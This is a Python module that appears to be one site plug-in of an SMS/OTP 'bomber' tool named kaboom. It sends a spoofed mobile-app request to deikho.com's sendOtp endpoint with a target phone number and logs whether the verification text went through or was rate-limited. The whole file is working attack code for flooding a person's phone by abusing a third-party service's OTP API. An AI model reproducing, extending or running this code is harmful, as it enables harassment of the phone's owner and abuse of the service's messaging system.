from kaboom.core import *
from kaboom.localuseragent import *


async def deikho(phone, client, out):
    name = "deikho"
    domain = "deikho"
    frequent_rate_limit=False
    headers = {
        'User-Agent': 'okhttp/5.0.0-alpha.14',
    }
    response = await client.post(
        'https://deikho.com/api/sendOtp',
        headers={'User-Agent': 'okhttp/5.0.0-alpha.14'},
        data={'phone': f'0{phone[-10:]}'}
    )
    try:
        data=response.json()
       
        if data["status"] == True and data["message"] == "Otp sent successfully":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["status"] == False:
            message = data.get("message", "")
            is_rate_limited = message == "" or "limit" in message.lower() or "try again later" in message.lower()
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": is_rate_limited,"sent": False, "error": not is_rate_limited, "reason": message or "otp request failed"})
            return None
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": True, "reason": data.get("message") or "otp request failed"})
        return None
    except Exception as exc:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
